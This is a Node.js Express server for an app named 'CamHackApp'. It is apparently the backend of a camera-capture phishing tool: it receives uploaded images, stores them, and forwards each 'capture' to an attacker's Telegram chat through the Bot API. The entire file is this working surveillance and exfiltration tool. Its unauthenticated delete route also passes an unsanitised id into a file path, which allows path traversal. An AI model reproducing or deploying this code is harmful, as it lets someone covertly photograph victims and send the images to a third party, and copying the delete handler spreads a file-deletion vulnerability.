const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const axios = require('axios');  // Telegram API call
const FormData = require('form-data');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ===== ENV =====
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// ===== Middleware =====
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ===== Static =====
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// ===== Uploads dir =====
const uploadDir = process.env.VERCEL
    ? path.join('/tmp', 'camhackapp-uploads')
    : path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

// ===== Multer =====
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const unique = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, unique + path.extname(file.originalname));
    }
});
const upload = multer({ storage });

// ===== Telegram send function =====
async function sendToTelegram(filePath, caption = 'New capture from CamHackApp') {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn('Telegram credentials missing');
        return false;
    }
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', fs.createReadStream(filePath), {
            filename: path.basename(filePath),
            contentType: 'image/jpeg'
        });
        formData.append('caption', caption);

        const response = await axios.post(url, formData, {
            headers: formData.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
            timeout: 30000
        });
        return response.data.ok === true;
    } catch (error) {
        console.error('Telegram send error:', error.message);
        return false;
    }
}

// ===== API Routes =====

// Upload + Telegram
app.post('/api/upload', upload.single('image'), async (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'No file uploaded' });
    }
    const fileUrl = `/uploads/${req.file.filename}`;
    const filePath = req.file.path;

    // Send to Telegram (non-blocking)
    const caption = `Captured at ${new Date().toLocaleString()}`;
    const tgSent = await sendToTelegram(filePath, caption);

    res.json({
        success: true,
        file: {
            id: req.file.filename,
            url: fileUrl,
            timestamp: Date.now()
        },
        telegram: tgSent ? 'sent' : 'failed'
    });
});

// Get all images
app.get('/api/images', (req, res) => {
    fs.readdir(uploadDir, (err, files) => {
        if (err) {
            return res.status(500).json({ error: 'Unable to read uploads' });
        }
        const images = files
            .filter(file => /\.(png|jpe?g|gif|webp)$/i.test(file))
            .map(file => ({
                id: file,
                url: `/uploads/${file}`,
                timestamp: file.split('-')[0]
            }))
            .sort((a, b) => b.timestamp - a.timestamp);
        res.json(images);
    });
});

// Safe configuration health check (never returns secrets)
app.get('/api/health', (req, res) => {
    res.json({
        ok: true,
        telegramConfigured: Boolean(BOT_TOKEN && CHAT_ID)
    });
});

// Delete image
app.delete('/api/images/:id', (req, res) => {
    const filePath = path.join(uploadDir, req.params.id);
    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'File not found' });
    }
    fs.unlink(filePath, (err) => {
        if (err) {
            return res.status(500).json({ error: 'Delete failed' });
        }
        res.json({ success: true });
    });
});

// SPA fallback
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (require.main === module && !process.env.VERCEL) {
    app.listen(PORT, () => {
        console.log(`CamHackApp server running on port ${PORT}`);
        console.log(`Telegram Bot: ${BOT_TOKEN ? '✅ Configured' : '❌ Missing'}`);
    });
}

module.exports = app;
